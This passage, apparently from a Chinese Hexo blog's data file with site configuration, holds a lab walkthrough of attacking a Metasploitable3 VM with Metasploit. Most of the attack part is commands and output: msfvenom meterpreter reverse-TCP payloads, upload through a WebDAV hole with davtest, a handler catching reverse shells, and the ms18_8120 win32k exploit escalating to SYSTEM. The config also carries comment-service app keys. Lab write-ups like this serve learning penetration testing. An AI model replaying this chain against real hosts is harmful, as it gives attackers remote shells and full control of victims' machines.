(192.168.1.66)\n  2         meterpreter x86/windows  NT AUTHORITY\\LOCAL SERVICE @ METASPLOITABLE3  192.168.1.70:13789 -> 192.168.1.66:54852 (192.168.1.66)\n  3         meterpreter x86/windows  NT AUTHORITY\\SYSTEM @ METASPLOITABLE3         192.168.1.70:4444 -> 192.168.1.66:62289 (192.168.1.66)\n```\n到此，复现完毕","slug":"msf","published":1,"mouth":"01","updated":"2020-09-17T11:33:37.031Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckffbhoxh000mez8k055oapzy","content":"<p>metasploit是一款非常给力的后渗透系统，本次通过复现vsftpd2.3.4的漏洞和ms18_8120的漏洞来学习metasploit<br><a id=\"more\"></a></p>\n<h4 id=\"介绍\"><a href=\"#介绍\" class=\"headerlink\" title=\"介绍\"></a>介绍</h4><p>&emsp;&emsp;首先一点，为什么metaslpoit（下称msf）强大呢，msf本身就有1851个漏洞利用模块，1046个辅助模块，541个漏洞利用模块，44个加密模块（v5.0.1），不仅如此，他还可以调用外部插件，而且本身也是开源的，也可以加载自己写的模块，msf很好但也不是最好的，本次主要是以学习msf为主，当然实验环境下也有更好的入侵方法。<br>&emsp;&emsp;进入msf的命令是msfconsole，如果提示数据库为开启则可以用<code>/etc/init.d/postgresql start</code>开启metasploit的数据库，如果你需要完成一次渗透测试，如果你手上没有合适的工具的话，msf可以完成所有的工作</p>\n<h4 id=\"一、扫描\"><a href=\"#一、扫描\" class=\"headerlink\" title=\"一、扫描\"></a>一、扫描</h4><p>&emsp;&emsp;msf调用nmap扫描的命令是大<code>db_nmap</code>，具体用法和nmap使用差不多，也可以使用msf的扫描模块进行扫描，常用的扫描模块有<code>brute_dirs</code>,<code>dir_listing</code>,<code>dir_scanner</code>。</p>\n<h4 id=\"二、复现\"><a href=\"#二、复现\" class=\"headerlink\" title=\"二、复现\"></a>二、复现</h4><p>&emsp;&emsp;目标主机192.168.1.66:8585上存在一个dav2的上传漏洞，攻击思路大概是我们可以先利用这个上传漏洞上传一个payload，实验入侵主机到进一步提权。<br>首先我们先制作一个payload<br><pre><code class=\"hljs undefined\">root@kali:~# msfvenom -p php/meterpreter_reverse_tcp <span class=\"hljs-attribute\">lhost</span>=192.168.1.70 <span class=\"hljs-attribute\">lport</span>=13579 -f<span class=\"hljs-built_in\"> raw </span>&gt; /root/Desktop/13579.php\n[-] <span class=\"hljs-literal\">No</span> platform was selected, choosing Msf::Module::Platform::PHP <span class=\"hljs-keyword\">from</span> the payload\n[-] <span class=\"hljs-literal\">No</span> arch selected, selecting arch: php <span class=\"hljs-keyword\">from</span> the payload\n<span class=\"hljs-literal\">No</span> encoder <span class=\"hljs-keyword\">or</span> badchars specified, outputting<span class=\"hljs-built_in\"> raw </span>payload\nPayload size: 30656 bytes</code></pre></p>\n<p><code>-p</code>选择payload，<code>lhost</code>是本地ip，<code>lport</code>为本地监听端口，<code>-f</code>格式，<code>&gt;</code>输出为文件</p>\n<p>然后我们需要上传脚本，上传脚本会用到davtest这个工具，davtest支持自动发送文件漏洞，目录自动随机帮助隐藏文件，发送文本文件，并尝试移动到可执行文件的名称，上传的文件自动清理，发送任意文件。<br><pre><code class=\"hljs undefined\">root@kali:~/Desktop# davtest -url http://192.168.1.66:8585/uploads/ -uploadfile 13579.php -uploadloc 13579.php \n<span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span>*\n Testing DAV connection\nOPEN\t\tSUCCEED:\t\thttp://192.168.1.66:8585/uploads\n<span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span>*\n unless  Uploading file\nUpload succeeded: http://192.168.1.66:8585/uploads/13579.php</code></pre></p>\n<p><code>-url</code>是网址，<code>-uploadfile</code>是要上传的文件，<code>-uploadloc</code>是要上传的位置。准备好了就可以开始打了<br><pre><code class=\"hljs undefined\">root@kali:~# msfconsole -q\n[-] ***\n[-] * WARNING: <span class=\"hljs-literal\">No</span> database support: could <span class=\"hljs-keyword\">not</span> connect <span class=\"hljs-keyword\">to</span> server:<span class=\"hljs-built_in\"> Connection </span>refused\n\tIs the<span class=\"hljs-built_in\"> server </span>running on host <span class=\"hljs-string\">\"localhost\"</span> (::1) <span class=\"hljs-keyword\">and</span> accepting\n\tTCP<span class=\"hljs-built_in\">/IP </span>connections on<span class=\"hljs-built_in\"> port </span>5432?\ncould <span class=\"hljs-keyword\">not</span> connect <span class=\"hljs-keyword\">to</span> server:<span class=\"hljs-built_in\"> Connection </span>refused\n\tIs the<span class=\"hljs-built_in\"> server </span>running on host <span class=\"hljs-string\">\"localhost\"</span> (127.0.0.1) <span class=\"hljs-keyword\">and</span> accepting\n\tTCP<span class=\"hljs-built_in\">/IP </span>connections on<span class=\"hljs-built_in\"> port </span>5432?\n\n[-] ***\n[*] Starting persistent handler(s)<span class=\"hljs-built_in\">..</span>.\nmsf5 &gt; use exploit/multi/handler \nmsf5 exploit(multi/handler) &gt; <span class=\"hljs-builtin-name\">set</span> payload php/meterpreter_reverse_tcp \npayload =&gt; php/meterpreter_reverse_tcp\nmsf5 exploit(multi/handler) &gt; <span class=\"hljs-builtin-name\">set</span> lport 13579\nlport =&gt; 13579\nmsf5 exploit(multi/handler) &gt; <span class=\"hljs-builtin-name\">set</span> lhost 192.168.1.70\nlhost =&gt; 192.168.1.70\nmsf5 exploit(multi/handler) &gt; exploit -j -z\n[*] Exploit running as background job 0.\n[*] Exploit completed, but <span class=\"hljs-literal\">no</span> session was created.\n[*] Started reverse TCP handler on 192.168.1.70:13579</code></pre></p>\n<p>启动msf时-q是不显示封面，<code>exploit -j -z</code>-j是把exploit放到jobs里，-z挂后台，jobs的意思是当监听到反弹的shell之后会建立一个session，然后不会不停下来，继续监听。session的可以理解为一个会话。到这里，我们只需要访问一下我们上传的payload就可以反弹shell了(可以用浏览器访问)<br><pre><code class=\"hljs undefined\">curl http:<span class=\"hljs-regexp\">//</span><span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">1.66</span>:<span class=\"hljs-number\">8585</span><span class=\"hljs-regexp\">/uploads/</span><span class=\"hljs-number\">13579</span>.php</code></pre></p>\n<p>getshell<br><pre><code class=\"hljs undefined\">msf5 exploit(multi/handler) &gt; [*] Meterpreter session 1 opened (192.168.1.70:13579 -&gt; 192.168.1.66:49816) at 2019-01-22 02:30:29 -0500\n[*] Meterpreter session 2 opened (192.168.1.70:13579 -&gt; 192.168.1.66:49817) at 2019-01-22 02:30:31 -0500\n\nmeterpreter &gt; background\nmsf5 exploit(multi/handler) &gt; sessions \n\nActive sessions\n===============\n\n  Id  Name <span class=\"hljs-built_in\"> Type </span>                    Information                         <span class=\"hljs-built_in\"> Connection\n</span>  --  ----  ----                     -----------                          ----------\n  1         meterpreter php/windows  LOCAL<span class=\"hljs-built_in\"> SERVICE </span>(0) @ METASPLOITABLE3  192.168.1.70:13579 -&gt; 192.168.1.66:49816 (192.168.1.66)</code></pre></p>\n<p>background是返回msf控制台，getshell之后得到的shell是local server的权限，我们上传一个另外一个payload上去get更高权限的shell<br><pre><code class=\"hljs undefined\">root@kali:~/Desktop# msfvenom -p windows/meterpreter_reverse_tcp <span class=\"hljs-attribute\">Lhost</span>=192.168.1.70 <span class=\"hljs-attribute\">lport</span>=13789 -f exe &gt; 13789.exe\n[-] <span class=\"hljs-literal\">No</span> platform was selected, choosing Msf::Module::Platform::Windows <span class=\"hljs-keyword\">from</span> the payload\n[-] <span class=\"hljs-literal\">No</span> arch selected, selecting arch: x86 <span class=\"hljs-keyword\">from</span> the payload\n<span class=\"hljs-literal\">No</span> encoder <span class=\"hljs-keyword\">or</span> badchars specified, outputting<span class=\"hljs-built_in\"> raw </span>payload\nPayload size: 179779 bytes\nFinal size of exe file: 254976 bytes</code></pre></p>\n<p>上传<br><pre><code class=\"hljs undefined\">root@kali:~/Desktop# davtest -url http://192.168.1.66:8585/uploads/ -uploadfile 13789.exe -uploadloc 13789.exe\n<span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span>*\n Testing DAV connection\nOPEN\t\tSUCCEED:\t\thttp://192.168.1.66:8585/uploads\n<span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span>*\n unless  Uploading file\nUpload succeeded: http://192.168.1.66:8585/uploads/13789.exe</code></pre></p>\n<p>msf开启监听,<code>sessions -i 1</code>选择id为1的session，<code>getwd</code>获取当前绝对路径，<code>execute -f</code>执行文件<br><pre><code class=\"hljs undefined\">msf5 exploit(multi/<span class=\"hljs-keyword\">handler</span>) &gt; <span class=\"hljs-keyword\">set</span> payload windows/meterpreter_reverse_tcp \npayload =&gt; windows/meterpreter_reverse_tcp\nmsf5 exploit(multi/<span class=\"hljs-keyword\">handler</span>) &gt; <span class=\"hljs-keyword\">show</span> options \nmsf5 exploit(multi/<span class=\"hljs-keyword\">handler</span>) &gt; <span class=\"hljs-keyword\">set</span> lport <span class=\"hljs-number\">13789</span>\nlport =&gt; <span class=\"hljs-number\">13789</span>\nmsf5 exploit(multi/<span class=\"hljs-keyword\">handler</span>) &gt; exploit -j -z\n\nmsf5 exploit(multi/<span class=\"hljs-keyword\">handler</span>) &gt; sessions -i <span class=\"hljs-number\">1</span>\n[*] Exploit running <span class=\"hljs-keyword\">as</span> background job <span class=\"hljs-number\">1.</span>\n[*] Exploit completed, but <span class=\"hljs-keyword\">no</span> <span class=\"hljs-keyword\">session</span> was created.\n\n[*] Started <span class=\"hljs-keyword\">reverse</span> TCP <span class=\"hljs-keyword\">handler</span> <span class=\"hljs-keyword\">on</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.1</span><span class=\"hljs-number\">.70</span>:<span class=\"hljs-number\">13789</span> \n\nmsf5 exploit(multi/<span class=\"hljs-keyword\">handler</span>) &gt; sessions -i <span class=\"hljs-number\">1</span>\n[*] <span class=\"hljs-keyword\">Starting</span> interaction <span class=\"hljs-keyword\">with</span> <span class=\"hljs-number\">1.</span>..\n\nmeterpreter &gt; getwd\nC:\\wamp\\www\\uploads\nmeterpreter &gt; <span class=\"hljs-keyword\">execute</span> -f <span class=\"hljs-string\">\"C:\\\\wamp\\\\www\\\\uploads\\\\13789.exe\"</span>\nProcess <span class=\"hljs-number\">1372</span> created.\nmeterpreter &gt; [*] Meterpreter <span class=\"hljs-keyword\">session</span> <span class=\"hljs-number\">3</span> opened (<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.1</span><span class=\"hljs-number\">.70</span>:<span class=\"hljs-number\">13789</span> -&gt; <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.1</span><span class=\"hljs-number\">.66</span>:<span class=\"hljs-number\">50670</span>) <span class=\"hljs-keyword\">at</span> <span class=\"hljs-number\">2019</span><span class=\"hljs-number\">-01</span><span class=\"hljs-number\">-22</span> <span class=\"hljs-number\">02</span>:<span class=\"hljs-number\">38</span>:<span class=\"hljs-number\">39</span> <span class=\"hljs-number\">-0500</span></code></pre></p>\n<p>我们用上传的第一个payload执行我们的第二次payload，就可以得到普通用户权限<br><pre><code class=\"hljs undefined\">msf5 exploit(multi/handler) &gt; sessions \nActive sessions\n===============\n\n  Id  Name <span class=\"hljs-built_in\"> Type </span>                    Information                                  <span class=\"hljs-built_in\"> Connection\n</span>  --  ----  ----                     -----------                                   ----------\n  1         meterpreter php/windows  LOCAL<span class=\"hljs-built_in\"> SERVICE </span>(0) @ METASPLOITABLE3           192.168.1.70:13579 -&gt; 192.168.1.66:53138 (192.168.1.66)\n  2         meterpreter x86/windows  NT AUTHORITY\\LOCAL<span class=\"hljs-built_in\"> SERVICE </span>@ METASPLOITABLE3  192.168.1.70:13789 -&gt; 192.168.1.66:54852 (192.168.1.66)</code></pre></p>\n<p>接下来用ms18_8120提权</p>\n<pre><code class=\"hljs undefined\">msf5 exploit(multi/<span class=\"hljs-keyword\">handler</span>) &gt; <span class=\"hljs-keyword\">use</span> exploit/windows/<span class=\"hljs-keyword\">local</span>/ms18_8120_win32k_privesc \nmsf5 exploit(windows/<span class=\"hljs-keyword\">local</span>/ms18_8120_win32k_privesc) &gt; <span class=\"hljs-keyword\">set</span> <span class=\"hljs-keyword\">session</span> <span class=\"hljs-number\">3</span>\n<span class=\"hljs-keyword\">session</span> =&gt; <span class=\"hljs-number\">3</span>\n\nmsf5 exploit(windows/<span class=\"hljs-keyword\">local</span>/ms18_8120_win32k_privesc) &gt; exploit \n\n[*] Started <span class=\"hljs-keyword\">reverse</span> TCP <span class=\"hljs-keyword\">handler</span> <span class=\"hljs-keyword\">on</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.1</span><span class=\"hljs-number\">.70</span>:<span class=\"hljs-number\">4444</span> \n[*] Sending stage (<span class=\"hljs-number\">179779</span> <span class=\"hljs-keyword\">bytes</span>) <span class=\"hljs-keyword\">to</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.1</span><span class=\"hljs-number\">.66</span>\n[+] Exploit finished, <span class=\"hljs-keyword\">wait</span> <span class=\"hljs-keyword\">for</span> privileged payload execution <span class=\"hljs-keyword\">to</span> complete.\n[*] Meterpreter <span class=\"hljs-keyword\">session</span> <span class=\"hljs-number\">4</span> opened (<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.1</span><span class=\"hljs-number\">.70</span>:<span class=\"hljs-number\">4444</span> -&gt; <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.1</span><span class=\"hljs-number\">.66</span>:<span class=\"hljs-number\">50799</span>) <span class=\"hljs-keyword\">at</span> <span class=\"hljs-number\">2019</span><span class=\"hljs-number\">-01</span><span class=\"hljs-number\">-22</span> <span class=\"hljs-number\">02</span>:<span class=\"hljs-number\">42</span>:<span class=\"hljs-number\">04</span> <span class=\"hljs-number\">-0500</span>\n\nmeterpreter &gt;</code></pre>\n<p>查看sessions就可以看到普通用户权限变成了system权限<br><pre><code class=\"hljs undefined\">msf5 exploit(windows/local/ms18_8120_win32k_privesc) &gt; sessions\n\nActive sessions\n===============\n\n  Id  Name <span class=\"hljs-built_in\"> Type </span>                    Information                                  <span class=\"hljs-built_in\"> Connection\n</span>  --  ----  ----                     -----------                                   ----------\n  1         meterpreter php/windows  LOCAL<span class=\"hljs-built_in\"> SERVICE </span>(0) @ METASPLOITABLE3           192.168.1.70:13579 -&gt; 192.168.1.66:53138 (192.168.1.66)\n  2         meterpreter x86/windows  NT AUTHORITY\\LOCAL<span class=\"hljs-built_in\"> SERVICE </span>@ METASPLOITABLE3  192.168.1.70:13789 -&gt; 192.168.1.66:54852 (192.168.1.66)\n  3         meterpreter x86/windows  NT AUTHORITY\\SYSTEM @ METASPLOITABLE3         192.168.1.70:4444 -&gt; 192.168.1.66:62289 (192.168.1.66)</code></pre></p>\n<p>到此，复现完毕</p>\n","site":{"data":{"fluid_config":{"favicon":"/img/static/favicon.ico","apple_touch_icon":"/img/static/favicon.ico","title_join_string":" - ","force_https":false,"code":{"copy_btn":true,"highlight":{"enable":true,"lib":"highlightjs","highlightjs":{"style":"Github Gist","bg_color":false},"prismjs":{"style":"default","preprocess":true}}},"fun_features":{"typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"mouse_click":{"enable":false,"style":"values"}},"dark_mode":{"enable":true,"default":"auto"},"color":{"body_bg_color":"#eee","body_bg_color_dark":"#181c27","navbar_bg_color":"#2f4154","navbar_bg_color_dark":"#1f3144","navbar_text_color":"#fff","navbar_text_color_dark":"#d0d0d0","text_color":"#3c4858","text_color_dark":"#c4c6c9","sec_text_color":"#718096","sec_text_color_dark":"#a7a9ad","post_text_color":"#2c3e50","post_text_color_dark":"#c4c6c9","post_heading_color":"#1a202c","post_heading_color_dark":"#c4c6c9","post_link_color":"#0366d6","post_link_color_dark":"#1589e9","link_hover_color":"#30a9de","link_hover_color_dark":"#30a9de","link_hover_bg_color":"#f8f9fa","link_hover_bg_color_dark":"#364151","board_color":"#fff","board_color_dark":"#252d38"},"font":{"font_size":"16px","font_family":null,"code_font_size":"85%"},"custom_js":null,"custom_css":null,"custom_html":"","web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"3vyTx5QfwzFij2bEnjvRIcxV-gzGzoHsz","app_key":"neatHwvRMvcDYnNxMBbGGFlP","server_url":"https://3vytx5qf.lc-cn-n1-shared.com"}},"lazyload":{"enable":true,"onlypost":false},"daovoice":{"enable":false,"appid":""},"aplayer":{"enable":false,"autoplay":false,"loop":"all","order":"random","theme":"#b7daff","songs":[{"name":"name","artist":"artist","url":"/songs/test.mp3","cover":"/img/cover.jpg"},{"name":"name","artist":"artist","url":"https://...url.mp3","cover":"https://...cover.jpg"}]},"version":{"check":false},"navbar":{"blog_title":"Lzywi'Blog","ground_glass":{"enable":false,"px":3,"alpha":0.7},"menu":[{"key":"home","link":"/","icon":"iconfont icon-home-fill"},{"key":"archive","link":"/archives/","icon":"iconfont icon-archive-fill"},{"key":"tag","link":"/tags/","icon":"iconfont icon-tags-fill"},{"key":"links","link":"/links/","icon":"iconfont icon-link-fill"},{"key":"about","link":"/about/","icon":"iconfont icon-user-fill"}]},"search":{"enable":true,"path":"/local-search.xml","generate_path":"/local-search.xml","field":"post","content":true},"scroll_down_arrow":{"enable":true,"banner_height_limit":90,"scroll_after_turning_page":true},"banner_parallax":true,"footer":{"statistics":{"enable":true,"source":"leancloud","pv_format":"总访问量 {} 次","uv_format":"总访客数 {} 人"},"allwordcount":{"enable":true,"format":"全站共计:{} 字"},"beian":{"enable":false,"icp_text":"京ICP证123456号","police_text":"京公网安备12345678号","police_code":12345678,"police_icon":"/img/static/police_beian.png"}},"scroll_top_arrow":{"enable":true},"index":{"banner_img":"/img/static/default2.jpg","banner_img_height":100,"banner_mask_alpha":0.3,"post_default_img":"","slogan":{"enable":true,"text":""},"hitokoto":{"enable":true},"auto_excerpt":{"enable":true},"post_url_target":"_self","post_meta":{"date":true,"category":true,"tag":true}},"page":{"banner_img":"/img/static/default2.jpg","banner_img_height":60,"banner_mask_alpha":0.3},"post":{"banner_img":"/img/static/default.jpg","banner_img_height":70,"banner_mask_alpha":0.3,"meta":{"author":{"enable":false},"date":{"enable":true,"format":"LL a"},"wordcount":{"enable":true,"format":"字数统计:{} 字"},"min2read":{"enable":true,"format":"阅读时长:{} 分钟","words":100},"views":{"enable":false,"source":"leancloud","format":"{} 次"}},"updated":{"enable":false,"content":"本文最后更新于：","relative":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"copyright":{"enable":true,"content":"本博客所有文章除特别声明外，均采用 <a href=\"https://creativecommons.org/licenses/by-sa/4.0/deed.zh\" rel=\"nofollow noopener\">CC BY-SA 4.0 协议</a> ，转载请注明出处！"},"prev_next":{"enable":true},"custom":{"enable":false,"content":"<img src=\"https://octodex.github.com/images/jetpacktocat.png\" class=\"rounded mx-auto d-block mt-5\" style=\"width:150px; height:150px;\">"},"image_zoom":{"enable":true},"footnote":{"enable":true,"header":""},"math":{"enable":false,"specific":false,"engine":"mathjax"},"mermaid":{"enable":false,"specific":false,"options":{"theme":"default"}},"comments":{"enable":true,"type":"valine"}},"utterances":{"repo":null,"issue_term":"pathname","label":"utterances","theme":"github-light","theme_dark":"github-dark","crossorigin":"anonymous"},"disqus":{"shortname":null,"disqusjs":false,"apikey":null},"gitalk":{"clientID":null,"clientSecret":null,"repo":null,"owner":null,"admin":["name"],"id":"location.pathname","language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true},"valine":{"appid":"6PEfc93t6icHph8NMpSh0OFO-gzGzoHsz","appkey":"i3vUWkHRRkiiS7LuUpuIm1E5","placeholder":"说些什么","path":"window.location.pathname","avatar":"retro","meta":["nick","mail","link"],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"sRx9dQVqzL65gdhuYexJtTPF"},"changyan":{"appid":"","appkey":""},"livere":{"uid":""},"remark42":{"host":"https://remark.haoyizebo.com","site_id":"haoyizebo","max_shown_comments":10,"locale":"zh"},"archive":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"归 档"},"tag":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"标 签","tagcloud":{"min_font":15,"max_font":30,"unit":"px","start_color":"#BBBBEE","end_color":"#337ab7"}},"about":{"banner_img":"/img/static/default1.png","banner_img_height":50,"banner_mask_alpha":0.3,"subtitle":"About me","avatar":"/img/static/avatar.png","name":"Lzywi","introduce":"Life is short, use Python.","icons":[{"class":"iconfont icon-github-fill","link":"https://github.com","tip":"GitHub"},{"class":"iconfont icon-douban-fill","link":"https://douban.com","tip":"豆瓣"},{"class":"iconfont icon-wechat-fill","qrcode":"/img/static/WeChat.jpg"}]},"page404":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"404"},"links":{"banner_img":"/img/static/default1.png","banner_img_height":55,"banner_mask_alpha":0.3,"subtitle":"Link","items":[{"title":" ZoE blog","intro":"Pwn的挖坑填坑之旅","link":"https://zoepla.github.io/#blog","image":"/img/Link/ZoE.jpg"},{"title":"Junay blog","intro":"网络安全爱好者","link":"https://delcoding.github.io","image":"/img/Link/Junay.png"},{"title":"Rhy7hm blog","intro":"恭喜你发现了毫无技术含量的博客","link":"https://rhythmmark.github.io","image":"/img/Link/Rhy7hm.png"},{"title":"Cy9nus blog","intro":"人如果没有梦想，跟咸鱼有什么区别","link":"https://cy9nusg4rd3n.github.io/","image":"/img/Link/Cy9nus.jpg"}]}}}},"excerpt":"<p>metasploit是一款非常给力的后渗透系统，本次通过复现vsftpd2.3.4的漏洞和ms18_8120的漏洞来学习metasploit<br>","more":"</p>\n<h4 id=\"介绍\"><a href=\"#介绍\" class=\"headerlink\" title=\"介绍\"></a>介绍</h4><p>&emsp;&emsp;首先一点，为什么metaslpoit（下称msf）强大呢，msf本身就有1851个漏洞利用模块，1046个辅助模块，541个漏洞利用模块，44个加密模块（v5.0.1），不仅如此，他还可以调用外部插件，而且本身也是开源的，也可以加载自己写的模块，msf很好但也不是最好的，本次主要是以学习msf为主，当然实验环境下也有更好的入侵方法。<br>&emsp;&emsp;进入msf的命令是msfconsole，如果提示数据库为开启则可以用<code>/etc/init.d/postgresql start</code>开启metasploit的数据库，如果你需要完成一次渗透测试，如果你手上没有合适的工具的话，msf可以完成所有的工作</p>\n<h4 id=\"一、扫描\"><a href=\"#一、扫描\" class=\"headerlink\" title=\"一、扫描\"></a>一、扫描</h4><p>&emsp;&emsp;msf调用nmap扫描的命令是大<code>db_nmap</code>，具体用法和nmap使用差不多，也可以使用msf的扫描模块进行扫描，常用的扫描模块有<code>brute_dirs</code>,<code>dir_listing</code>,<code>dir_scanner</code>。</p>\n<h4 id=\"二、复现\"><a href=\"#二、复现\" class=\"headerlink\" title=\"二、复现\"></a>二、复现</h4><p>&emsp;&emsp;目标主机192.168.1.66:8585上存在一个dav2的上传漏洞，攻击思路大概是我们可以先利用这个上传漏洞上传一个payload，实验入侵主机到进一步提权。<br>首先我们先制作一个payload<br><pre><code class=\"hljs undefined\">root@kali:~# msfvenom -p php/meterpreter_reverse_tcp <span class=\"hljs-attribute\">lhost</span>=192.168.1.70 <span class=\"hljs-attribute\">lport</span>=13579 -f<span class=\"hljs-built_in\"> raw </span>&gt; /root/Desktop/13579.php\n[-] <span class=\"hljs-literal\">No</span> platform was selected, choosing Msf::Module::Platform::PHP <span class=\"hljs-keyword\">from</span> the payload\n[-] <span class=\"hljs-literal\">No</span> arch selected, selecting arch: php <span class=\"hljs-keyword\">from</span> the payload\n<span class=\"hljs-literal\">No</span> encoder <span class=\"hljs-keyword\">or</span> badchars specified, outputting<span class=\"hljs-built_in\"> raw </span>payload\nPayload size: 30656 bytes</code></pre></p>\n<p><code>-p</code>选择payload，<code>lhost</code>是本地ip，<code>lport</code>为本地监听端口，<code>-f</code>格式，<code>&gt;</code>输出为文件</p>\n<p>然后我们需要上传脚本，上传脚本会用到davtest这个工具，davtest支持自动发送文件漏洞，目录自动随机帮助隐藏文件，发送文本文件，并尝试移动到可执行文件的名称，上传的文件自动清理，发送任意文件。<br><pre><code class=\"hljs undefined\">root@kali:~/Desktop# davtest -url http://192.168.1.66:8585/uploads/ -uploadfile 13579.php -uploadloc 13579.php \n<span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span>*\n Testing DAV connection\nOPEN\t\tSUCCEED:\t\thttp://192.168.1.66:8585/uploads\n<span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span>*\n unless  Uploading file\nUpload succeeded: http://192.168.1.66:8585/uploads/13579.php</code></pre></p>\n<p><code>-url</code>是网址，<code>-uploadfile</code>是要上传的文件，<code>-uploadloc</code>是要上传的位置。准备好了就可以开始打了<br><pre><code class=\"hljs undefined\">root@kali:~# msfconsole -q\n[-] ***\n[-] * WARNING: <span class=\"hljs-literal\">No</span> database support: could <span class=\"hljs-keyword\">not</span> connect <span class=\"hljs-keyword\">to</span> server:<span class=\"hljs-built_in\"> Connection </span>refused\n\tIs the<span class=\"hljs-built_in\"> server </span>running on host <span class=\"hljs-string\">\"localhost\"</span> (::1) <span class=\"hljs-keyword\">and</span> accepting\n\tTCP<span class=\"hljs-built_in\">/IP </span>connections on<span class=\"hljs-built_in\"> port </span>5432?\ncould <span class=\"hljs-keyword\">not</span> connect <span class=\"hljs-keyword\">to</span> server:<span class=\"hljs-built_in\"> Connection </span>refused\n\tIs the<span class=\"hljs-built_in\"> server </span>running on host <span class=\"hljs-string\">\"localhost\"</span> (127.0.0.1) <span class=\"hljs-keyword\">and</span> accepting\n\tTCP<span class=\"hljs-built_in\">/IP </span>connections on<span class=\"hljs-built_in\"> port </span>5432?\n\n[-] ***\n[*] Starting persistent handler(s)<span class=\"hljs-built_in\">..</span>.\nmsf5 &gt; use exploit/multi/handler \nmsf5 exploit(multi/handler) &gt; <span class=\"hljs-builtin-name\">set</span> payload php/meterpreter_reverse_tcp \npayload =&gt; php/meterpreter_reverse_tcp\nmsf5 exploit(multi/handler) &gt; <span class=\"hljs-builtin-name\">set</span> lport 13579\nlport =&gt; 13579\nmsf5 exploit(multi/handler) &gt; <span class=\"hljs-builtin-name\">set</span> lhost 192.168.1.70\nlhost =&gt; 192.168.1.70\nmsf5 exploit(multi/handler) &gt; exploit -j -z\n[*] Exploit running as background job 0.\n[*] Exploit completed, but <span class=\"hljs-literal\">no</span> session was created.\n[*] Started reverse TCP handler on 192.168.1.70:13579</code></pre></p>\n<p>启动msf时-q是不显示封面，<code>exploit -j -z</code>-j是把exploit放到jobs里，-z挂后台，jobs的意思是当监听到反弹的shell之后会建立一个session，然后不会不停下来，继续监听。session的可以理解为一个会话。到这里，我们只需要访问一下我们上传的payload就可以反弹shell了(可以用浏览器访问)<br><pre><code class=\"hljs undefined\">curl http:<span class=\"hljs-regexp\">//</span><span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">1.66</span>:<span class=\"hljs-number\">8585</span><span class=\"hljs-regexp\">/uploads/</span><span class=\"hljs-number\">13579</span>.php</code></pre></p>\n<p>getshell<br><pre><code class=\"hljs undefined\">msf5 exploit(multi/handler) &gt; [*] Meterpreter session 1 opened (192.168.1.70:13579 -&gt; 192.168.1.66:49816) at 2019-01-22 02:30:29 -0500\n[*] Meterpreter session 2 opened (192.168.1.70:13579 -&gt; 192.168.1.66:49817) at 2019-01-22 02:30:31 -0500\n\nmeterpreter &gt; background\nmsf5 exploit(multi/handler) &gt; sessions \n\nActive sessions\n===============\n\n  Id  Name <span class=\"hljs-built_in\"> Type </span>                    Information                         <span class=\"hljs-built_in\"> 